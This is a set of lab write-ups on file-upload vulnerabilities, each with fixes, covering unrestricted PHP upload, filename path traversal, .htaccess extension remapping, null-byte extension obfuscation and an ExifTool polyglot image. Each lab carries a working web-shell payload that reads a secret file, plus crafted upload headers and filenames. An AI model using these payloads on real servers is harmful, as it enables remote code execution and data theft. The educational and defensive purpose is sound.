# File Upload Vulnerabilities — Three Lab Writeups

A practical reference for understanding unrestricted uploads, path traversal in upload filenames, and Apache `.htaccess` execution bypasses. These notes document three progressively harder file-upload challenges and the reasoning used to solve each one.

---

## Table of Contents

1. [Lab 1 — Unrestricted File Upload](#lab-1--unrestricted-file-upload)
2. [Lab 2 — Path Traversal in File Upload](#lab-2--path-traversal-in-file-upload)
3. [Lab 3 — Bypassing Extension Validation with `.htaccess`](#lab-3--bypassing-extension-validation-with-htaccess)
4. [Background — Additional Bypass Concepts](#background--additional-bypass-concepts)
   - [Insufficient Blacklisting of Dangerous File Types](#insufficient-blacklisting-of-dangerous-file-types)
   - [Overriding the Server Configuration](#overriding-the-server-configuration)
   - [Obfuscating File Extensions](#obfuscating-file-extensions)
   - [Flawed Validation of File Contents](#flawed-validation-of-the-files-contents)
5. [Lab 5 — Web Shell Upload via Obfuscated File Extension](#lab-5--web-shell-upload-via-obfuscated-file-extension)
6. [Lab 6 — Remote Code Execution via Polyglot Web Shell Upload](#lab-6--remote-code-execution-via-polyglot-web-shell-upload)
7. [Comparison](#comparison)
8. [Key Lessons](#key-lessons)

---

## Lab 1 — Unrestricted File Upload

### Objective

The first lab represents the simplest form of a file-upload vulnerability: there is effectively no protection on uploaded file types or execution. The goal was to upload a PHP file and have the server execute it.

### Initial Observation

I uploaded a normal image as my avatar and inspected the request in Burp Suite under:

```
Proxy → HTTP history
```

The application accepted the file and stored it in a web-accessible directory. The request used to retrieve it looked like:

```
GET /files/avatars/image.jpg
```

This confirmed that uploaded files were served directly from a predictable, accessible path.

### Creating the PHP Payload

I created a file called `exploit.php`:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

The logic is simple:

- PHP executes the file.
- `file_get_contents()` reads the target file.
- `echo` prints its contents in the HTTP response.

### Uploading the PHP File

I uploaded `exploit.php` as my avatar. There was no server-side validation preventing executable files from being uploaded, so the file was accepted and stored.

### Executing the File

Using the earlier avatar request as a template, I requested the uploaded file directly:

```
GET /files/avatars/exploit.php
```

Instead of returning the raw PHP source, the server executed it. The response contained the contents of `/home/carlos/secret`.

### Why This Worked

```
Upload PHP
     ↓
PHP file stored
     ↓
Request uploaded file
     ↓
Web server executes PHP
     ↓
PHP reads target file
     ↓
Contents returned
```

The application trusted the uploaded file without validating whether it could be executed by the server.

### Vulnerability

**Unrestricted File Upload / Arbitrary File Upload** — the application had no meaningful restriction on executable uploads.

### Security Impact

- Arbitrary code execution
- Sensitive file disclosure
- Application compromise
- Data theft
- Potential server takeover

### Recommended Fix

- Validate file type server-side, based on actual content, not just extension or `Content-Type`.
- Generate random, server-side filenames.
- Store uploads outside the web root where possible.
- Disable script execution in upload directories.
- Use an allowlist of permitted file types.
- Never let user-controlled filenames determine filesystem paths.

---

## Lab 2 — Path Traversal in File Upload

### Objective

The second lab added protection against directly uploading executable files. However, the upload mechanism still trusted the user-controlled filename. The goal was to abuse path traversal to influence where the uploaded file was stored.

### Initial Testing

I first tried the same basic approach as Lab 1 — uploading `exploit.php` directly. This time the application rejected it, confirming some form of extension validation was in place.

### Inspecting the Filename

Looking at the upload request in Burp Suite, the filename was passed as a client-controlled parameter, similar to:

```
filename="image.jpg"
```

This raised the question: does the application safely handle directory traversal characters inside the filename?

### Understanding `%2F`

`%2F` is the URL-encoded form of `/`. Combined with `..` (parent directory reference), it can be used to traverse outside the intended upload directory. For example:

```
..%2Fexploit.php
```

decodes to:

```
../exploit.php
```

### Testing the Upload Path

Instead of a plain filename, the upload request's filename field was manipulated to include an encoded traversal sequence, conceptually:

```
normal-directory/../target-directory/file
```

The goal was to make the server resolve the final storage location somewhere other than the intended, restricted upload directory — for example, a location where uploaded files are executable.

### Why This Worked

```
User-controlled filename
        ↓
Application builds upload path
        ↓
Path traversal sequence
        ↓
Path is resolved outside intended directory
        ↓
File is written somewhere unintended
        ↓
Uploaded file becomes accessible/executable
```

The protection focused on validating the uploaded file itself, not on securely controlling the final filesystem path derived from user input.

### Key Lesson

Whenever an application accepts a filename from a user, check whether traversal sequences such as `../`, `..\`, `%2F`, or `%5C` are normalized and rejected. Filesystem paths should never be constructed directly from attacker-controlled filenames.

### Vulnerability

**Path Traversal / Arbitrary File Write via File Upload** — the application allowed user-controlled filename data to influence the destination path.

### Security Impact

- Overwriting application files
- Writing files into executable directories
- Uploading web shells
- Configuration manipulation
- Arbitrary code execution

### Recommended Fix

- Never use the original filename as a filesystem path.
- Generate a random filename server-side.
- Strip directory components from user-supplied filenames.
- Canonicalize and validate the final destination path.
- Verify the resolved path stays inside the intended upload directory.
- Disable execution within upload directories.

```
User filename
      ↓
Ignore it for filesystem storage
      ↓
Generate random server filename
      ↓
Store outside web root
      ↓
Serve through controlled download endpoint
```

---

## Lab 3 — Bypassing Extension Validation with `.htaccess`

### Objective

The third lab had the strongest protection of the three: directly uploading `exploit.php` was blocked. However, the server ran Apache and allowed `.htaccess` configuration files to be uploaded. The goal was to abuse Apache's per-directory configuration to make a harmless-looking extension execute as PHP.

### Step 1 — Upload a Normal Image

I logged in, uploaded a normal image as my avatar, and inspected the traffic in:

```
Proxy → HTTP history
```

The avatar retrieval request looked like:

```
GET /files/avatars/image.jpg
```

I sent this request to Repeater, since I would reuse it later to access the malicious file.

### Step 2 — Create the PHP Payload

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

Saved as `exploit.php`.

### Step 3 — Test the Protection

I attempted to upload `exploit.php` as the avatar. The application rejected it, confirming `.php` files were blocked specifically:

```
exploit.php
   ↓
Extension validation
   ↓
  BLOCKED
```

### Step 4 — Identify Apache

Inspecting the response headers from the upload request showed the application was running on Apache — an important clue, since Apache supports directory-level configuration via `.htaccess`.

### Step 5 — Upload `.htaccess`

In Burp Repeater, I modified the multipart upload request:

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

This was not a PHP file, so it passed the extension check, and Apache accepted the configuration file.

### What Does the Directive Do?

```
AddType application/x-httpd-php .l33t
```

This tells Apache: *treat any file ending in `.l33t` as PHP.*

Before:

```
.php   → PHP
.l33t  → ordinary/unknown file
```

After the `.htaccess` is in place:

```
.php   → PHP
.l33t  → PHP
```

The extension itself isn't inherently special — what matters is how the web server has been configured to interpret it.

### Step 6 — Rename the PHP Payload

I returned to the original upload request and changed:

```
filename="exploit.php"
```

to:

```
filename="exploit.l33t"
```

keeping the PHP payload unchanged. Since `.l33t` wasn't blocked, the upload succeeded. The server now held two files: `.htaccess` and `exploit.l33t`.

### Step 7 — Request the `.l33t` File

Using the Repeater tab with the avatar `GET` request, I changed:

```
GET /files/avatars/image.jpg
```

to:

```
GET /files/avatars/exploit.l33t
```

Because of the uploaded `.htaccess`, Apache interpreted `exploit.l33t` as PHP and executed it:

```
exploit.l33t
      ↓
Apache
      ↓
application/x-httpd-php
      ↓
PHP executes
      ↓
file_get_contents()
      ↓
Carlos's secret
```

The response contained the secret.

### Step 8 — Submit the Secret

The secret returned in the response was submitted to complete the lab.

### Why This Bypass Worked

The application's protection was based on a single assumption: *".php is dangerous."* But the server's actual behavior was: *".php is executable"* — and, after the attacker-controlled `.htaccess`, *".l33t is also executable."*

This demonstrates why file-upload security cannot rely solely on checking the filename extension against a blocklist.

### Vulnerability

**Web Server Configuration Bypass via `.htaccess` Upload** — uploading a server configuration file allowed redefinition of which extensions are treated as executable.

### Security Impact

- Full remote code execution
- Bypass of extension-based upload filters
- Sensitive file disclosure
- Complete compromise of the upload directory

### Recommended Fix

- Disallow uploading `.htaccess`, `web.config`, or any server configuration files.
- Disable `AllowOverride` for upload directories so `.htaccess` files have no effect.
- Serve uploaded files from a separate domain or storage service with no script execution capability.
- Use an allowlist (not a blocklist) of permitted extensions.
- Validate actual file content/magic bytes, not just extension.

---

## Background — Additional Bypass Concepts

Beyond the three labs above, there's a broader set of concepts worth understanding before tackling Labs 5 and 6 below. These cover *why* blacklists fail in general, how server configuration can be overridden, how extensions can be obfuscated, and how content-based validation can still be bypassed.

A note on infrastructure: even when all requests appear to go to a single domain, that domain often points to a reverse proxy of some kind (e.g., a load balancer). Requests may be routed to different backend servers behind the scenes, and those servers can be configured inconsistently with one another — which itself can create exploitable gaps in upload validation.

### Insufficient Blacklisting of Dangerous File Types

One of the more obvious defenses is to blacklist potentially dangerous extensions like `.php`. This approach is inherently flawed because it's difficult to enumerate every extension that could result in code execution. Blacklists can often be bypassed using lesser-known, alternative extensions that are still executable by the server, such as:

- `.php5`
- `.shtml`
- `.phtml`
- other framework- or server-specific executable extensions

Because a blacklist only blocks what its authors thought to include, any executable extension left off the list defeats the protection entirely.

### Overriding the Server Configuration

Servers generally won't execute a given file type unless they've been explicitly configured to do so. For example, before an Apache server executes PHP files, its global config (e.g., `/etc/apache2/apache2.conf`) typically needs directives such as:

```apache
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

Many servers also support directory-specific configuration files that override or extend the global settings:

- **Apache** — loads directory-specific config from a file named `.htaccess`, if present.
- **IIS** — loads directory-specific config from a file named `web.config`. For example, the following directive maps `.json` files to be served with the `application/json` MIME type:

```xml
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

Under normal circumstances, these configuration files aren't accessible via HTTP requests directly. However, some applications fail to prevent users from *uploading* their own configuration file to a directory the server will honor. In that case, even if the extension you actually want to use is blacklisted, you may be able to trick the server into mapping an arbitrary custom extension to an executable MIME type — which is exactly the technique used in Lab 3 above with `.htaccess` and `.l33t`.

### Obfuscating File Extensions

Even a very thorough blacklist can potentially be bypassed with classic obfuscation techniques. A few examples:

- **Case manipulation.** If validation is case-sensitive but the extension-to-MIME-type mapping isn't, a file like `exploit.pHp` may slip past the check while still being executed as PHP.
- **Multiple extensions.** Depending on how the filename is parsed, a file like `exploit.php.jpg` might be interpreted as either a PHP file or a JPEG image.
- **Trailing characters.** Some components strip or ignore trailing whitespace or dots, so `exploit.php.` (with a trailing dot) may still execute as PHP after the trailing character is dropped server-side.
- **URL encoding (or double encoding).** If dots, slashes, or backslashes are URL-encoded and the value isn't decoded during validation — but *is* decoded later, server-side — a filename like `exploit%2Ephp` can bypass the check.
- **Semicolons or null bytes before the extension.** If validation happens in a high-level language (PHP, Java) but the file is ultimately processed with lower-level C/C++ functions, discrepancies in what counts as "the end of the filename" can be abused, e.g., `exploit.asp;.jpg` or `exploit.asp%00.jpg`.
- **Multibyte Unicode characters.** Sequences such as `\xC0\x2E`, `\xC4\xAE`, or `\xC0\xAE` may be interpreted as `.` after Unicode normalization, while passing initial validation as something else entirely.
- **Non-recursive stripping of dangerous strings.** If an application strips a substring like `.php` from a filename but only does so once, you can nest it so that removing it still leaves a valid, executable extension behind. For example, stripping `.php` from:

  ```
  exploit.p.phphp
  ```

  leaves `exploit.php` — assuming the strip isn't applied recursively.

This is only a sample of the many ways an extension check can be obfuscated around; the underlying principle is always the same: **validation and execution use different logic to interpret the same filename, and the attacker exploits the gap between them.**

### Flawed Validation of the File's Contents

Rather than trusting the `Content-Type` header a client provides, more robust servers try to verify that a file's actual contents match what's expected.

For image uploads, this can include checks like:

- **Intrinsic properties** — e.g., verifying the file has valid image dimensions. A PHP script has no dimensions at all, so a server that checks this can reject it outright.
- **Magic bytes / file signatures** — many file types begin (or end) with a specific, predictable byte sequence. For example, JPEG files always start with the bytes `FF D8 FF`. Servers can check for this signature as a lightweight fingerprint of the real file type.

Content-based validation is significantly more robust than trusting the extension or `Content-Type` alone, but it still isn't foolproof. Tools such as **ExifTool** make it straightforward to build a *polyglot* file — for example, a JPEG that is entirely valid as an image but also carries malicious code embedded in its metadata, which can later be triggered if that file is processed or included as if it were a script.

---

## Lab 5 — Web Shell Upload via Obfuscated File Extension

### Objective

This lab blacklists certain file extensions, but the defense can be bypassed using a classic obfuscation technique: a URL-encoded null byte placed before an allowed extension. The goal was to upload a PHP web shell and use it to read `/home/carlos/secret`.

### Step 1 — Upload a Normal Avatar

I logged in, uploaded a normal image as my avatar, and returned to the account page.

### Step 2 — Capture the Avatar Request

In Burp Suite:

```
Proxy → HTTP history
```

I found the request used to fetch my uploaded avatar:

```
GET /files/avatars/<my-image>
```

and sent it to **Repeater**, since I'd reuse it later to access the malicious file.

### Step 3 — Create the PHP Payload

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Saved as `exploit.php`.

### Step 4 — Test the Baseline Restriction

I attempted to upload `exploit.php` as my avatar. The response indicated that only JPG and PNG files were allowed, confirming an extension check was in place.

### Step 5 — Send the Upload Request to Repeater

In:

```
Proxy → HTTP history
```

I located the `POST /my-account/avatar` request used for the rejected upload and sent it to a second **Repeater** tab.

### Step 6 — Obfuscate the Filename with a Null Byte

In the request body, I found the `Content-Disposition` header for the uploaded file and changed the `filename` parameter to include a URL-encoded null byte followed by an allowed extension:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg
```

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Step 7 — Send the Upload

Sending the request succeeded. The confirmation message referred to the uploaded file simply as `exploit.php` — indicating that the null byte and the trailing `.jpg` had been stripped server-side, leaving the original dangerous extension intact on disk.

### Step 8 — Request the Uploaded File

Switching to the first Repeater tab (the avatar `GET` request), I replaced the image filename in the path with `exploit.php`:

```
GET /files/avatars/exploit.php
```

### Step 9 — Execute the Web Shell

Sending the request caused the server to execute `exploit.php` as PHP. The response contained the contents of `/home/carlos/secret`.

### Step 10 — Submit the Secret

The secret was submitted in the lab banner to solve the lab.

### Why This Worked

```
Filename submitted:      exploit.php%00.jpg
        ↓
Extension check (high-level validation) sees: ".jpg"  → allowed
        ↓
Filename stored/processed with lower-level function (C/C++-based)
        ↓
Null byte treated as end-of-string
        ↓
Trailing ".jpg" is discarded along with everything after the null byte
        ↓
File saved as: exploit.php
        ↓
Server executes it as PHP
```

The validation logic (checking the extension at the end of the string) and the underlying file-handling logic (which terminates strings at a null byte) disagreed about where the filename actually ends. That mismatch is what allowed the dangerous extension to survive.

### Vulnerability

**Extension Blacklist Bypass via Null Byte Injection**

### Security Impact

- Remote code execution
- Full bypass of an extension-based filter using a single crafted filename
- Same downstream risks as an unrestricted upload (data theft, server compromise, etc.)

### Recommended Fix

- Perform all filename validation and truncation using the same string-handling logic the file system will ultimately use — ideally in the same language/layer, with no null-byte ambiguity.
- Reject filenames containing null bytes or other control characters outright.
- Generate a random, server-controlled filename and discard the client-supplied name entirely, rather than trying to sanitize it.
- Use an allowlist of extensions validated after any decoding/normalization is complete, not before.

---

## Lab 6 — Remote Code Execution via Polyglot Web Shell Upload

### Objective

This lab checks the actual contents of the uploaded file to verify it's a genuine image, not just its extension or `Content-Type`. The goal was to upload and execute server-side code anyway, then use it to read `/home/carlos/secret`.

### Step 1 — Create the PHP Payload

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Saved as `exploit.php`.

### Step 2 — Confirm Content Validation Is in Place

I logged in and attempted to upload `exploit.php` directly as my avatar, including trying some of the filename-obfuscation techniques from earlier labs (double extensions, null bytes, case changes, and so on).

All of these were blocked. This confirmed the server wasn't just checking the extension or `Content-Type` — it was validating the actual contents of the uploaded file to make sure it was a genuine image.

### Step 3 — Build a Polyglot PHP/JPG File

Since the server verifies real image content, the payload needed to live *inside* a file that is a fully valid image. I used **ExifTool** to embed the PHP payload into an image's metadata, specifically its `Comment` field:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

This command:

- Takes a genuine `.jpg` image as input.
- Writes the PHP payload into the image's `Comment` metadata field.
- Saves the result with a `.php` extension, as `polyglot.php`.

The resulting file passes as a structurally valid JPEG (correct headers, valid image data) while also containing executable PHP in its metadata. Wrapping the secret's contents between `START` and `END` markers makes it easy to isolate later, since the response will otherwise be full of binary image data.

### Step 4 — Upload the Polyglot File

In the browser, I uploaded `polyglot.php` as my avatar. Because the file's actual image data was valid, the server's content-based checks passed, and the upload succeeded — despite the `.php` extension.

### Step 5 — Locate the Uploaded File

I returned to my account page, then checked Burp's proxy history for:

```
GET /files/avatars/polyglot.php
```

### Step 6 — Extract the Secret from the Response

I sent this request and inspected the response. Since the response body is mostly binary image data, I used the message editor's search feature to locate the `START` string within it. Between `START` and `END`, the response contained Carlos's secret, for example:

```
START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
```

### Step 7 — Submit the Secret

The secret was submitted in the lab banner to solve the lab.

### Why This Worked

```
Server validates: is this really an image? (dimensions, magic bytes, structure)
        ↓
polyglot.php IS a structurally valid JPEG → passes content check
        ↓
Upload accepted despite ".php" extension
        ↓
File requested directly via web-accessible path
        ↓
Server executes it as PHP (extension-based handler mapping)
        ↓
PHP interpreter parses the <?php ... ?> block embedded in the Comment field
        ↓
Contents of /home/carlos/secret returned
```

Content validation checks that a file *is* a valid image — it doesn't guarantee that the file *only* contains image data. Metadata fields like `Comment`, `EXIF` tags, and similar are largely free-form text areas that a strict image-format check will happily ignore, but that a script interpreter will still parse if the file is executed as code.

### Vulnerability

**Remote Code Execution via Polyglot File Upload**

### Security Impact

- Full remote code execution, even against upload functions that validate real file content
- Bypasses image-dimension and magic-byte checks entirely, since the file is a genuine, valid image
- Demonstrates that content validation alone is not sufficient without also controlling execution

### Recommended Fix

- Never allow uploaded files to be served from, or executed within, a location that maps extensions to script handlers (e.g., serve user uploads from a separate domain/storage service with no script execution capability).
- Re-encode/re-process uploaded images server-side (e.g., resizing or re-saving through an image library) so that embedded metadata like EXIF comments is stripped rather than preserved verbatim.
- Store uploads with a server-generated filename and no executable extension, regardless of what the client submits.
- Layer defenses: content validation, extension allowlisting, and disabling execution in the upload directory should all be present together, since no single control is sufficient on its own — as these six labs collectively show.

---

## Comparison

| Lab | Protection | Bypass | Result |
|-----|-----------|--------|--------|
| Lab 1 | No meaningful upload protection | Upload `.php` directly | PHP execution |
| Lab 2 | File upload / path restrictions | Manipulate filename/path using traversal (`%2F`) | File written to unintended location |
| Lab 3 | `.php` extension blocked | Upload `.htaccess` and map `.l33t` to PHP | PHP execution |
| Lab 5 | Extension blacklist | Obfuscate filename with a URL-encoded null byte (`exploit.php%00.jpg`) | PHP execution |
| Lab 6 | Content-based image validation | Embed PHP payload in image metadata via ExifTool (polyglot file) | PHP execution |

---

## Key Lessons

These three labs show a natural progression in how to approach file-upload testing:

**Lab 1 — "Can I upload executable code?"**
Start simple: try uploading `exploit.php` directly. If it works, there's likely arbitrary code execution with no further effort needed.

**Lab 2 — "Can I control where the file is stored?"**
If direct execution is blocked, look at the upload path itself: filename handling, path normalization, URL encoding, and traversal sequences. The vulnerability may be an arbitrary file write rather than a simple unrestricted upload.

**Lab 3 — "What does the server consider executable?"**
If `.php` is blocked, don't assume PHP execution is impossible. Understand how the underlying web server (e.g., Apache) determines what counts as executable, and whether that behavior can be reconfigured through an upload, such as `.htaccess`.

**Beyond the labs — "Is the check itself trustworthy?"**
Even when a blacklist, server config, or content check exists, ask whether the validation logic and the execution logic agree on what a file *is*. Case sensitivity mismatches, double extensions, encoding tricks, null bytes, and non-recursive string stripping all exploit gaps between how a filename is validated and how it's later interpreted. Content-based checks (dimensions, magic bytes) close a lot of these gaps, but polyglot files (e.g., crafted with ExifTool) show that even content validation isn't a silver bullet.

**Lab 5 & Lab 6 — "Does validation cover the full picture — filename encoding *and* actual content?"**
Lab 5 showed that filename validation and low-level file handling can disagree about where a filename actually ends: a URL-encoded null byte let a dangerous extension survive validation while an allowed extension was silently stripped afterward. Lab 6 went a step further — even when the server genuinely validates file *content* (not just extension), an attacker can build a polyglot file that is simultaneously a valid image and a valid PHP script, using tools like ExifTool to smuggle code into metadata fields that structural image checks don't inspect. Together they show that filename parsing and content validation both need to be airtight, and that no single layer of defense — extension checks, encoding handling, or content validation — is sufficient by itself.

**General takeaway:** file-upload security fails when protections are based on narrow assumptions (e.g., "block `.php`") rather than a holistic, allowlist-based approach that controls file type, filename, storage path, execution permissions, *and* validates real file content — while also making sure the validation and execution logic can't be tricked into disagreeing with each other.
